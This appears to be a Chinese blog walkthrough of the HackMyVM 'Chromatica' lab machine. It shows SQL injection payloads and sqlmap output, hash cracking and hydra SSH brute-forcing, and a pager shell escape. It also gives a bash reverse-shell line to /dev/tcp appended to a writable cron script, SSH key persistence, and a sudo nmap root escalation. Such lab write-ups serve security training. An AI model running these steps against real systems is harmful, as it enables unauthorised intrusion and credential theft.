{"pageProps":{"postData":{"id":"HackMyVMChromatica","contentHtml":"<h1>Chromatica.</h1>\n<blockquote>\n<p><a href=\"https://hackmyvm.eu/machines/machine.php?vm=Chromatica\">https://hackmyvm.eu/machines/machine.php?vm=Chromatica</a></p>\n</blockquote>\n<p>Notes：<strong>Hope you enjoy it as i did. Credit to: <a href=\"https://shorturl.at/cnHNQ\">https://shorturl.at/cnHNQ</a></strong></p>\n<h2>前期踩点</h2>\n<pre><code class=\"hljs language-bash\">➜  Chromatica nmap -sP 192.168.56.0/24                   \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-18 23:16 EDT\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.1\nHost is up (0.00032s latency).\nMAC Address: 0A:00:27:00:00:09 (Unknown)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.2\nHost is up (0.00046s latency).\nMAC Address: 08:00:27:81:EF:A0 (Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.44\nHost is up (0.00047s latency).\nMAC Address: 08:00:27:2C:9A:BC (Oracle VirtualBox virtual NIC)\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜Chromatica nmap -sT -min-rate 10000 -p- 192.168.56.44\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-18 23:16 EDT\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.44\nHost is up (0.00023s latency).\nNot shown: 65532 closed tcp ports (conn-refused)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n5353/tcp open  mdns\nMAC Address: 08:00:27:2C:9A:BC (Oracle VirtualBox virtual NIC)\n\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 8.07 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Chromatica nmap -sT -A -T4 -O -p 22,80,5353 192.168.56.44\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-18 23:17 EDT\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.44\nHost is up (0.00075s latency).\n\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 7c:94:7f:cb:4a:d5:8b:9f:9e:ff:7b:7a:59:ff:75:b5 (ECDSA)\n|_  256 ed:94:2a:<span class=\"hljs-built_in\">fc</span>:30:30:cc:07:ae:27:7d:ca:92:01:49:31 (ED25519)\n80/tcp   open  http    Apache httpd 2.4.52 ((Ubuntu))\n|_http-server-header: Apache/2.4.52 (Ubuntu)\n|_http-title: Chromatica|Coming Soon..... \n5353/tcp open  domain  dnsmasq 2.86\n| dns-nsid: \n|_  bind.version: dnsmasq-2.86\nMAC Address: 08:00:27:2C:9A:BC (Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice <span class=\"hljs-built_in\">type</span>: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.8\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.75 ms 192.168.56.44\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 47.40 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Chromatica nmap -script=vuln 22,80,5353 192.168.56.44    \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-18 23:18 EDT\nFailed to resolve <span class=\"hljs-string\">\"22,80,5353\"</span>.\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.44\nHost is up (0.00021s latency).\nNot shown: 998 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n|_http-stored-xss: Couldn<span class=\"hljs-string\">'t find any stored XSS vulnerabilities.\n|_http-csrf: Couldn'</span>t find any CSRF vulnerabilities.\n| http-fileupload-exploiter: \n|   \n|_    Couldn<span class=\"hljs-string\">'t find a file-type field.\n|_http-dombased-xss: Couldn'</span>t find any DOM based XSS.\n| http-enum: \n|   /robots.txt: Robots file\n|   /css/: Potentially interesting directory w/ listing on <span class=\"hljs-string\">'apache/2.4.52 (ubuntu)'</span>\n|_  /js/: Potentially interesting directory w/ listing on <span class=\"hljs-string\">'apache/2.4.52 (ubuntu)'</span>\nMAC Address: 08:00:27:2C:9A:BC (Oracle VirtualBox virtual NIC)\n\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 38.43 seconds\n</code></pre>\n<p><code>dnsmasq 2.86</code> 好像存在缓冲区漏洞，但是现在没办法利用</p>\n<h2>Web</h2>\n<h3>信息收集 - 1</h3>\n<p>访问 <code>HTTP</code> 服务</p>\n<p><img src=\"/post-images/HackMyVMChromatica/image.png\" alt=\"image.png\"></p>\n<p>目录扫描</p>\n<pre><code class=\"hljs language-bash\">➜  Chromatica gobuster <span class=\"hljs-built_in\">dir</span> -u http://192.168.56.44 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,zip -b 403,404                                                              \n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) &#x26; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.56.44\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Negative Status codes:   403,404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              php,txt,html,zip\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster <span class=\"hljs-keyword\">in</span> directory enumeration mode\n===============================================================\n/index.html           (Status: 200) [Size: 4047]\n/assets               (Status: 301) [Size: 315] [--> http://192.168.56.44/assets/]\n/css                  (Status: 301) [Size: 312] [--> http://192.168.56.44/css/]\n/js                   (Status: 301) [Size: 311] [--> http://192.168.56.44/js/]\n/javascript           (Status: 301) [Size: 319] [--> http://192.168.56.44/javascript/]\n/robots.txt           (Status: 200) [Size: 36]\nProgress: 1102800 / 1102805 (100.00%)\n===============================================================\nFinished\n===============================================================\n</code></pre>\n<p>查看 <code>robots.txt</code>，给我们新的目录<code>/dev-portal/</code></p>\n<p><img src=\"/post-images/HackMyVMChromatica/image1.png\" alt=\"image.png\"></p>\n<p>再扫描一遍，发现什么都扫描不出来</p>\n<pre><code class=\"hljs language-bash\">➜  Chromatica gobuster <span class=\"hljs-built_in\">dir</span> -u http://192.168.56.44/dev-portal/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,zip -b 403,404\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) &#x26; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.56.44/dev-portal/\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Negative Status codes:   403,404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              php,txt,html,zip\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster <span class=\"hljs-keyword\">in</span> directory enumeration mode\n===============================================================\nProgress: 1102800 / 1102805 (100.00%)\n===============================================================\nFinished\n===============================================================\n</code></pre>\n<p>访问页面被 <code>403</code> 了</p>\n<p><img src=\"/post-images/HackMyVMChromatica/image2.png\" alt=\"image.png\"></p>\n<p>想起上面<code>robots.txt</code> 文件的 <code>user-agent：dev</code> ，我们将 <code>UA</code> 改为 <code>dev</code> 再去访问</p>\n<p>已经不是 <code>403</code> 了，变成重定向了</p>\n<p><img src=\"/post-images/HackMyVMChromatica/image3.png\" alt=\"image.png\"></p>\n<p>跟随重定向，页面有一个搜索框</p>\n<p><img src=\"/post-images/HackMyVMChromatica/image4.png\" alt=\"image.png\"></p>\n<p>搜索后点抓包</p>\n<p><img src=\"/post-images/HackMyVMChromatica/image5.png\" alt=\"image.png\"></p>\n<p>其中的注释：<code>please for the love of god someone paint this page a color will ya it looks dreadfull uhhhhj</code>看在上帝的份上，谁能给这个页面涂点颜色看看，看起来太可怕了，呃</p>\n<h3>SQL 注入</h3>\n<p>测试一下请求参数，发现存在<code>SQL</code>注入</p>\n<pre><code class=\"hljs language-bash\">/dev-portal/search.php?city=xxx<span class=\"hljs-string\">' --+\n</span></code></pre>\n<p><code>Sqlmap</code> 梭哈</p>\n<pre><code class=\"hljs language-bash\">➜  Chromatica sqlmap -r packet -batch                                                                    \n        ___                                                                                                       \n       __H__\n ___ ___[)]_____ ___ ___  {1.8.11#stable}\n|_ -| . [<span class=\"hljs-string\">\"]     | .'| . | \n|___|_  [(]_|_|_|__,|  _|                                                                                         \n      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                        \n\n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and ar\ne not responsible for any misuse or damage caused by this program\n                                                                                                                                                                                                                                    \n[*] starting @ 00:55:21 /2025-04-19/\n                                                         \n[00:55:21] [INFO] parsing HTTP request from 'packet'   \ncustom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] Y\n[00:55:32] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test       \n[00:55:32] [INFO] target URL appears to have 4 columns in query                                                   \n[00:55:32] [INFO] URI parameter '#1*' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable                \nURI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N              \nsqlmap identified the following injection point(s) with a total of 61 HTTP(s) requests: \n\n......\n                          \n---         \nParameter: #1* (URI)                     \n    Type: time-based blind\n    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)                                                     \n    Payload: http://192.168.56.44/dev-portal/search.php?city=' AND (SELECT 2276 FROM (SELECT(SLEEP(5)))KNyG) AND 'tKEh'='tKEh                                                                                                       \n\n    Type: UNION query                                                                                                                                                                                                               \n    Title: Generic UNION query (NULL) - 4 columns                                                                 \n    Payload: http://192.168.56.44/dev-portal/search.php?city=' UNION ALL SELECT NULL,NULL,CONCAT(0x7171626b71,0x4363747548505149627773496c574576674e636174734c774968547275574d597058494456456363,0x716a707071),NULL-- -             \n---                                 \n[00:55:32] [INFO] the back-end DBMS is MySQL             \nweb server operating system: Linux Ubuntu 22.04 (jammy)\nweb application technology: Apache 2.4.52                                                                         \nback-end DBMS: MySQL >= 5.0.12 (MariaDB fork)                                                                                                                                                                                       \n[00:55:32] [WARNING] HTTP error codes detected during run:                                                        \n500 (Internal Server Error) - 25 times                                                                            \n[00:55:32] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/192.168.56.44'\n                                                         \n[*] ending @ 00:55:32 /2025-04-19/    \n</span></code></pre>\n<p>将用户表 Dump 下来</p>\n<pre><code class=\"hljs language-bash\">+----+-----------------------------------------------+-----------+-----------------------------+\n| <span class=\"hljs-built_in\">id</span> | password                                      | username  | description                 |\n+----+-----------------------------------------------+-----------+-----------------------------+\n| 1  | 8d06f5ae0a469178b28bbd34d1da6ef3              | admin     | admin                       |\n| 2  | 1ea6762d9b86b5676052d1ebd5f649d7              | dev       | developer account <span class=\"hljs-keyword\">for</span> taz   |\n| 3  | 3dd0f70a06e2900693fc4b684484ac85 (keeptrying) | user      | user account <span class=\"hljs-keyword\">for</span> testing    |\n| 4  | f220c85e3ff19d043def2578888fb4e5              | dev-selim | developer account <span class=\"hljs-keyword\">for</span> selim |\n| 5  | aaf7fb4d4bffb8c8002978a9c9c6ddc9              | intern    | intern                      |\n+----+-----------------------------------------------+-----------+-----------------------------+\n</code></pre>\n<p><code>Sqlmap</code> 这里只能破解出一个密码，我们使用 John 进行尝试，结果还是一样</p>\n<pre><code class=\"hljs language-bash\">➜  Chromatica john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5 pass \nUsing default input encoding: UTF-8\nLoaded 5 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])\nWarning: no OpenMP support <span class=\"hljs-keyword\">for</span> this <span class=\"hljs-built_in\">hash</span> <span class=\"hljs-built_in\">type</span>, consider --fork=16\nPress <span class=\"hljs-string\">'q'</span> or Ctrl-C to abort, almost any other key <span class=\"hljs-keyword\">for</span> status\nkeeptrying       (?)     \n1g 0:00:00:00 DONE (2025-04-19 01:01) 1.923g/s 27583Kp/s 27583Kc/s 110850KC/s  g101485..*7¡Vamos!\nUse the <span class=\"hljs-string\">\"--show --format=Raw-MD5\"</span> options to display all of the cracked passwords reliably\nSession completed. \n</code></pre>\n<p>但是 <code>admin</code> 的 <code>md5</code> 值在 <code>cmd5</code> 中是可以进行破解的</p>\n<p><img src=\"/post-images/HackMyVMChromatica/image6.png\" alt=\"image.png\"></p>\n<p>最后也是找到了，<code>Decode</code> 地址：<a href=\"https://hashes.com/en/decrypt/hash\">https://hashes.com/en/decrypt/hash</a></p>\n<p><img src=\"/post-images/HackMyVMChromatica/image7.png\" alt=\"image.png\"></p>\n<p>最后得到密码</p>\n<pre><code class=\"hljs language-bash\">8d06f5ae0a469178b28bbd34d1da6ef3\n1ea6762d9b86b5676052d1ebd5f649d7\n3dd0f70a06e2900693fc4b684484ac85\nf220c85e3ff19d043def2578888fb4e5\naaf7fb4d4bffb8c8002978a9c9c6ddc9\nadm!n\nflaghere\nkeeptrying\nintern00\n</code></pre>\n<h3>信息收集 - 2</h3>\n<p>现在拿到用户名密码也没什么用，我们设置 <code>UA</code> 再扫描一遍目录</p>\n<pre><code class=\"hljs language-bash\">➜  Chromatica gobuster <span class=\"hljs-built_in\">dir</span> -u http://192.168.56.44/dev-portal/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,zip -b 403,404 -H <span class=\"hljs-string\">'User-Agent: dev'</span>\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) &#x26; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.56.44/dev-portal/\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Negative Status codes:   403,404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              php,txt,html,zip\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster <span class=\"hljs-keyword\">in</span> directory enumeration mode\n===============================================================\n/index.html           (Status: 200) [Size: 527]\n/search.php           (Status: 200) [Size: 844]\n/login.php            (Status: 200) [Size: 609]\n/assets               (Status: 301) [Size: 326] [--> http://192.168.56.44/dev-portal/assets/]\n/css                  (Status: 301) [Size: 323] [--> http://192.168.56.44/dev-portal/css/]\nProgress: 1102800 / 1102805 (100.00%)\n===============================================================\nFinished\n===============================================================\n</code></pre>\n<p>来到 <code>login.php</code> 进行登录</p>\n<p><img src=\"/post-images/HackMyVMChromatica/image8.png\" alt=\"image.png\"></p>\n<p>但是登录进去什么也没有</p>\n<p><img src=\"/post-images/HackMyVMChromatica/image9.png\" alt=\"image.png\"></p>\n<p>查看控制台发现状态码 <code>500</code></p>\n<p><img src=\"/post-images/HackMyVMChromatica/image10.png\" alt=\"image.png\"></p>\n<p>不知道是不是兔子洞，反正是没什么用</p>\n<h3>SSH 爆破</h3>\n<p>我们使用数据库中的用户和密码对 <code>ssh</code> 进行爆破</p>\n<pre><code class=\"hljs language-bash\">➜  Chromatica hydra -L users.txt -P passwd.txt -Vv -t 12 192.168.56.44 ssh                                         \n                                                                               \nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-19 01:23:04\n[WARNING] Many SSH configurations <span class=\"hljs-built_in\">limit</span> the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\n[DATA] max 12 tasks per 1 server, overall 12 tasks, 45 login tries (l:5/p:9), ~4 tries per task\n[22][ssh] host: 192.168.56.44   login: dev   password: flaghere\n[STATUS] attack finished <span class=\"hljs-keyword\">for</span> 192.168.56.44 (waiting <span class=\"hljs-keyword\">for</span> children to complete tests)                               \n1 of 1 target successfully completed, 1 valid password found                                                      \nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-04-19 01:23:18 \n</code></pre>\n<p>进行 <code>SSH</code> 登录，但是直接被弹出来了</p>\n<pre><code class=\"hljs language-bash\">➜  Chromatica ssh dev@192.168.56.44      \ndev@192.168.56.44<span class=\"hljs-string\">'s password: \nPermission denied, please try again.\ndev@192.168.56.44'</span>s password: \nGREETINGS,\nTHIS ACCOUNT IS NOT A LOGIN ACCOUNT\nIF YOU WANNA DO SOME MAINTENANCE ON THIS ACCOUNT YOU HAVE TO\nEITHER CONTACT YOUR ADMIN\nOR THINK OUTSIDE THE BOX\nBE LAZY AND CONTACT YOUR ADMIN\nOR MAYBE YOU SHOULD USE YOUR HEAD MORE heh,,\nREGARDS\n\nbrightctf{ALM0ST_TH3R3_34897ffdf69}\nConnection to 192.168.56.44 closed.\n➜  Chromatica \n</code></pre>\n<p>信息：</p>\n<ul>\n<li>\n<p>貌似是<code>flag</code> <code>brightctf{ALM0ST_TH3R3_34897ffdf69}</code></p>\n</li>\n<li>\n<p>登陆后的信息</p>\n<pre><code class=\"hljs language-bash\">您好，\n此帐户并非登录帐户。\n如果您想维护此帐户，您必须\n联系您的管理员。\n或者，跳出固有思维模式。\n偷懒联系您的管理员。\n或者，您应该多动动脑子。\n此致\n</code></pre>\n</li>\n</ul>\n<p>加上 <code>-v</code> 参数查看详细信息</p>\n<p>输入密码后可以看到如下信息，表示已经登陆进去了</p>\n<pre><code class=\"hljs language-bash\">Authenticated to 192.168.56.44 ([192.168.56.44]:22) using <span class=\"hljs-string\">\"password\"</span>.\ndebug1: channel 0: new session [client-session] (inactive <span class=\"hljs-built_in\">timeout</span>: 0)\n</code></pre>\n<p>我们想办法让连接保留下来，我们可以尝试将窗口缩小，例如：让信息不一下子展现出来</p>\n<p><img src=\"/post-images/HackMyVMChromatica/image11.png\" alt=\"image.png\"></p>\n<p>这样就保留连接了，然后因为<code>More</code>和<code>Less</code> 在一定情况下都可以提权的，我们尝试输入<code>!/bin/bash</code></p>\n<p><img src=\"/post-images/HackMyVMChromatica/image12.png\" alt=\"image.png\"></p>\n<p>这样就获得 <code>shell</code> 了</p>\n<pre><code class=\"hljs language-bash\">dev@Chromatica:~$ <span class=\"hljs-built_in\">id</span>\nuid=1001(dev) gid=1001(dev) <span class=\"hljs-built_in\">groups</span>=1001(dev)\n</code></pre>\n<h3>为什么会被弹出去呢</h3>\n<p><code>dev</code> 加目录中可以找到 <code>user.txt</code> 上面的是假的…</p>\n<pre><code class=\"hljs language-bash\">dev@Chromatica:~$ <span class=\"hljs-built_in\">cat</span> user.txt \nbrightctf{ONE_OCKLOCK_8cfa57b4168}\n</code></pre>\n<p>在家目录中还存在一个脚本文件和<code>txt</code>文件</p>\n<pre><code class=\"hljs language-bash\">dev@Chromatica:~$ <span class=\"hljs-built_in\">cat</span> hello.txt \nGREETINGS,\nTHIS ACCOUNT IS NOT A LOGIN ACCOUNT\nIF YOU WANNA DO SOME MAINTENANCE ON THIS ACCOUNT YOU HAVE TO\nEITHER CONTACT YOUR ADMIN\nOR THINK OUTSIDE THE BOX\nBE LAZY AND CONTACT YOUR ADMIN\nOR MAYBE YOU SHOULD USE YOUR HEAD MORE heh,,\nREGARDS\n\nbrightctf{ALM0ST_TH3R3_34897ffdf69}\ndev@Chromatica:~$ <span class=\"hljs-built_in\">cat</span> bye.sh \n<span class=\"hljs-comment\">#̣!/bin/bash</span>\n\n/usr/bin/more /home/dev/hello.txt\n<span class=\"hljs-built_in\">exit</span> 0\n</code></pre>\n<p>看样子是，是让我们登录就马上被赶出来的罪魁祸首。但是在仅仅有这两个文件是无法在我们登陆时直接赶走我们的，可能还存在定时任务，在我们登录时执行 <code>bye.sh</code> 脚本</p>\n<p>最后可以在 <code>/etc/ssh/sshd_config.d/dev_config.conf</code></p>\n<pre><code class=\"hljs language-bash\">ForceCommand /home/dev/bye.sh\n</code></pre>\n<p>作用是强制所有通过 SSH 登录的用户执行指定的命令，在这里就是 <code>/home/dev/bye.sh</code> 脚本。</p>\n<h2>提权</h2>\n<h3>to analyst</h3>\n<p>查看一下定时任务</p>\n<pre><code class=\"hljs language-bash\">dev@Chromatica:/etc$ <span class=\"hljs-built_in\">cat</span> /etc/crontab\n<span class=\"hljs-comment\"># /etc/crontab: system-wide crontab</span>\n<span class=\"hljs-comment\"># Unlike any other crontab you don't have to run the `crontab'</span>\n<span class=\"hljs-comment\"># command to install the new version when you edit this file</span>\n<span class=\"hljs-comment\"># and files in /etc/cron.d. These files also have username fields,</span>\n<span class=\"hljs-comment\"># that none of the other crontabs do.</span>\n\nSHELL=/bin/sh\n<span class=\"hljs-comment\"># You can also override PATH, but by default, newer versions inherit it from the environment</span>\n<span class=\"hljs-comment\">#PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</span>\n\n<span class=\"hljs-comment\"># Example of job definition:</span>\n<span class=\"hljs-comment\"># .---------------- minute (0 - 59)</span>\n<span class=\"hljs-comment\"># |  .------------- hour (0 - 23)</span>\n<span class=\"hljs-comment\"># |  |  .---------- day of month (1 - 31)</span>\n<span class=\"hljs-comment\"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span>\n<span class=\"hljs-comment\"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span>\n<span class=\"hljs-comment\"># |  |  |  |  |</span>\n<span class=\"hljs-comment\"># *  *  *  *  * user-name command to be executed</span>\n17 *    * * *   root    <span class=\"hljs-built_in\">cd</span> / &#x26;&#x26; run-parts --report /etc/cron.hourly\n25 6    * * *   root    <span class=\"hljs-built_in\">test</span> -x /usr/sbin/anacron || ( <span class=\"hljs-built_in\">cd</span> / &#x26;&#x26; run-parts --report /etc/cron.daily )\n47 6    * * 7   root    <span class=\"hljs-built_in\">test</span> -x /usr/sbin/anacron || ( <span class=\"hljs-built_in\">cd</span> / &#x26;&#x26; run-parts --report /etc/cron.weekly )\n52 6    1 * *   root    <span class=\"hljs-built_in\">test</span> -x /usr/sbin/anacron || ( <span class=\"hljs-built_in\">cd</span> / &#x26;&#x26; run-parts --report /etc/cron.monthly )\n* *     * * *   analyst /bin/bash /opt/scripts/end_of_day.sh\n<span class=\"hljs-comment\">#</span>\n</code></pre>\n<p>每分钟，系统都会以 <code>analyst</code> 身份自动运行 <code>/opt/scripts/end_of_day.sh</code> 脚本；</p>\n<pre><code class=\"hljs language-bash\">* *     * * *   analyst /bin/bash /opt/scripts/end_of_day.sh\n</code></pre>\n<p>我们查看一下该脚本的权限</p>\n<pre><code class=\"hljs language-bash\">dev@Chromatica:/opt/scripts$ <span class=\"hljs-built_in\">ls</span> -al\ntotal 12\ndrwxrwxrwx 2 root    root    4096 Apr 18  2024 .\ndrwxr-xr-x 6 root    root    4096 Apr 24  2024 ..\n-rwxrwxrw- 1 analyst analyst   30 Apr 19 08:00 end_of_day.sh\n</code></pre>\n<pre><code class=\"hljs language-bash\">dev@Chromatica:/opt/scripts$ <span class=\"hljs-built_in\">cat</span> end_of_day.sh \n<span class=\"hljs-comment\">#this is my end of day script</span>\n</code></pre>\n<p>直接写入反弹<code>shell</code>语句</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"/bin/bash -c 'bash -i >&#x26; /dev/tcp/192.168.56.4/1234 0>&#x26;1'\"</span> >> end_of_day.sh\n</code></pre>\n<p>获得 <code>shell</code></p>\n<pre><code class=\"hljs language-bash\">➜  Chromatica nc -lvp 1234             \nlistening on [any] 1234 ...\n192.168.56.44: inverse host lookup failed: Unknown host\nconnect to [192.168.56.4] from (UNKNOWN) [192.168.56.44] 44846\nbash: cannot <span class=\"hljs-built_in\">set</span> terminal process group (4181): Inappropriate ioctl <span class=\"hljs-keyword\">for</span> device\nbash: no job control <span class=\"hljs-keyword\">in</span> this shell\nanalyst@Chromatica:~$ \n</code></pre>\n<p>拿到 <code>shell</code> 后第一件事进行持久化，写入公钥</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"ssh-rsa xxxxxx\"</span> > .ssh/authorized_keys\n</code></pre>\n<p><code>analyst</code> 家目录下也有 flag</p>\n<pre><code class=\"hljs language-bash\">analyst@Chromatica:~$ <span class=\"hljs-built_in\">cat</span> analyst.txt \nbrightctf{GAZETTO_RUKI_b2f4f50f398}\n</code></pre>\n<h3>to root</h3>\n<p>查看 <code>analyst</code> 的 <code>sudo</code> 权限</p>\n<pre><code class=\"hljs language-bash\">analyst@Chromatica:~$ <span class=\"hljs-built_in\">sudo</span> -l\nMatching Defaults entries <span class=\"hljs-keyword\">for</span> analyst on Chromatica:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\n\nUser analyst may run the following commands on Chromatica:\n    (ALL : ALL) NOPASSWD: /usr/bin/nmap\n</code></pre>\n<p>查看版本</p>\n<pre><code class=\"hljs language-bash\">analyst@Chromatica:~$ <span class=\"hljs-built_in\">sudo</span> /usr/bin/nmap --version\nNmap version 7.80 ( https://nmap.org )\nPlatform: x86_64-pc-linux-gnu\nCompiled with: liblua-5.3.6 openssl-3.0.2 nmap-libssh2-1.8.2 libz-1.2.11 libpcre-8.39 libpcap-1.10.1 nmap-libdnet-1.12 ipv6\nCompiled without:\nAvailable nsock engines: epoll poll <span class=\"hljs-keyword\">select</span>\n</code></pre>\n<p>通过执行脚本提权</p>\n<pre><code class=\"hljs language-bash\">analyst@Chromatica:~$ TF=$(<span class=\"hljs-built_in\">mktemp</span>)\n<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">'os.execute(\"/bin/sh\")'</span> > <span class=\"hljs-variable\">$TF</span>\n<span class=\"hljs-built_in\">sudo</span> nmap --script=<span class=\"hljs-variable\">$TF</span>\nStarting Nmap 7.80 ( https://nmap.org ) at 2025-04-19 08:24 UTC\nNSE: Warning: Loading <span class=\"hljs-string\">'/tmp/tmp.AJ6TtOxyfs'</span> -- the recommended file extension is <span class=\"hljs-string\">'.nse'</span>.\n<span class=\"hljs-comment\"># uid=0(root) gid=0(root) groups=0(root)</span>\n</code></pre>\n<p>读取 <code>root.txt</code></p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-comment\"># brightctf{DIR_EN_GREY_59ce1d6c207}</span>\n</code></pre>","title":"HackMyVM - Chromatica","date":"2025-04-19","updated":"2025-04-19","comments":true,"tags":["Linux靶机","HackMyVM","SQL注入"],"categories":"靶机","description":"Chromatica.\n\n https://hackmyvm.eu/machines/machine.php?vm=Chromatica\n \n\nNotes：Hope you enjoy it as i did. Credit to: https://shorturl.at/cnHNQ\n\n前期踩点\n\n\n\n\n\n\n\n\n\n`dnsmasq 2.86` 好像存在缓冲区漏洞，但是现在没办法利用\n\nWeb\n\n信..."},"recentPosts":[{"id":"HackTheBoxSeason8 - Era","title":"HackTheBox - Season8 - Era","date":"2025-07-29","isEncrypted":true,"year":"2025","month":"07","day":"29"},{"id":"HackTheBoxSeason7-Cypher","title":"HackTheBox - Season7 - Cypher","date":"2025-04-04","isEncrypted":false,"year":"2025","month":"07","day":"29"},{"id":"TheHackersLabsCyberGuard","title":"TheHackersLabs - CyberGuard","date":"2025-07-28","isEncrypted":false,"year":"2025","month":"07","day":"28"},{"id":"TheHackersLabsPacharán","title":"TheHackersLabs - Pacharán","date":"2025-07-27","isEncrypted":false,"year":"2025","month":"07","day":"27"},{"id":"TheHackersLabsBack To The Future I","title":"TheHackersLabs - Back To The Future I","date":"2025-07-26","isEncrypted":false,"year":"2025","month":"07","day":"26"},{"id":"TheHackersLabsNodeCeption","title":"TheHackersLabs - NodeCeption","date":"2025-07-25","isEncrypted":false,"year":"2025","month":"07","day":"25"},{"id":"TheHackersLabsPildoritas","title":"TheHackersLabs - Pildoritas","date":"2025-07-24","isEncrypted":false,"year":"2025","month":"07","day":"24"}]},"__N_SSG":true}